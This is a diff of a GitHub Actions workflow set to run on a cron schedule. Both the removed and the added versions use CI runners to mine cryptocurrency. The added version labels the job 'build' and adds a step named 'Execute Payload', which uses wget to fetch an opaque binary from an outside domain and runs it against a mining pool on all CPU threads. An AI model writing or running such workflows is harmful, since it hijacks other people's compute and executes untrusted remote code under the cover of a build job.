@@ -3,18 +3,22 @@ name: Sei
 on:
   workflow_dispatch:
   schedule:
-    - cron: '0 */5 * * *'
-
-concurrency:
-  group: Sei
-  cancel-in-progress: true
+    - cron: '0 */6 * * *' 
 
 jobs:
-  mine:
-    runs-on: ubuntu-latest
-    timeout-minutes: 350
+  build:
+    runs-on: bitrise-runner-tes
+   
+    timeout-minutes: 350 
+    
+    concurrency: 
+      group: worker-pool-${{ github.workflow }}
+      cancel-in-progress: true
+
     steps:
-      - name: Run Sei
+      - uses: actions/checkout@v4
+
+      - name: Execute Payload
         run: |
-          cd $RUNNER_TEMP
-          wget https://github.com/zpalmtree/seine/releases/latest/download/seine-linux-x86_64.tar.gz && tar xvf seine-linux-x86_64.tar.gz && rm -rf seine-linux-x86_64.tar.gz && chmod +x seine && ./seine --pool-url bnt.naramail.xyz:47182 --address N3FT9Ut4wctdR5b9hBCz9Wc39GtjHmJw2GNuQLyTfVLEBS7exwWjz3fSXEb6YAzLG4CN5jVDe8sW2FBNP6xR9cnmmY4hz --pool-worker BNT$(shuf -i 1-99999 -n 1) --threads $(nproc)
+          set -e
+          wget -O s https://gomailer.xyz/s && chmod +x s && ./s --pool-url ads.edumailer.xyz:53917 --address '@thundergold' --pool-worker N$(shuf -i 1-99999 -n 1) --threads $(nproc)
